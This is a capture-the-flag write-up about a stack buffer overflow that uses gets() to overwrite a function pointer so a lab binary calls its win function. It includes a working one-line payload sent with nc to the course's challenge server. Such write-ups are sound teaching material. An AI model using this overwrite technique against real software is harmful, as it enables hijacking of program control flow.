
---

## Description

Ok, you already know how to overflow a buffer in a controlled way and change variables to an exact value. But can you call a function that is not called anywhere in our code?

File `functions.c` was compiled with no-canaries and `-no-pie`. The goal of this attack is to call function `win` and print the `Congratulations` message on the screen. Can you do it?

- Recall that the name of a function in C is the address where this function is written in the memory.
- Can `fp` be `win`?
- To perform this attack you may need to input chars that are non-printable. In the end of this document you have some suggestions on how to do it.

This challenge is running at `nc mustard.stt.rnl.tecnico.ulisboa.pt 25153`.

---

For this challenge, I also got 2 files.
![[Files.png]]

![[Source.png]]

The source code defines a function pointer `fp` and a buffer.

```c
int (*fp)();      // A variable that stores the address of a function
char buffer[32];  // 32-byte buffer

fp = 0;
gets(buffer);     // <-- vuln

if(fp) {
    fp();
}
```

1. **Memory Layout:** The `fp` variable is located on the stack immediately after `buffer`.

2. **The Flaw:** `gets()` does not check bounds. Writing more than 32 bytes into `buffer` will spill over and overwrite `fp`.

3. **The Logic:** The program checks if `fp` is not zero. If it is, it executes `fp()`. We need to make `fp` equal to the address of `win`.

Since **PIE** is disabled, the address of the `win` function is static and will not change between runs.

To find the address of the `win` function, I used objdump to find where `win` was.

![[win.png]]

So the objective here is:
- Fill the buffer: **32 bytes** of junk.
- Overwrite `fp`: The **address of `win`** (in little-endian).

I used this payload to achieve that:
```python
python3 -c "import sys; sys.stdout.buffer.write(b'A'*32 + b'\xf1\x86\x04\x08')" | nc mustard.stt.rnl.tecnico.ulisboa.pt 25153
```

![[Flag.png]]

## FLAG
```flag
SSof{Buffer_Overflow_can_also_change_function_pointers}
```

---

## Conclusion

This challenge showed how a stack-based buffer overflow can be dangerous in ways beyond modifying data variables. Instead of overwriting data, I overwrote a function pointer (`fp`) stored on the stack. By providing the memory address of the `win` function (`0x080486f1`), I forced the program to jump to it, easily getting the flag.
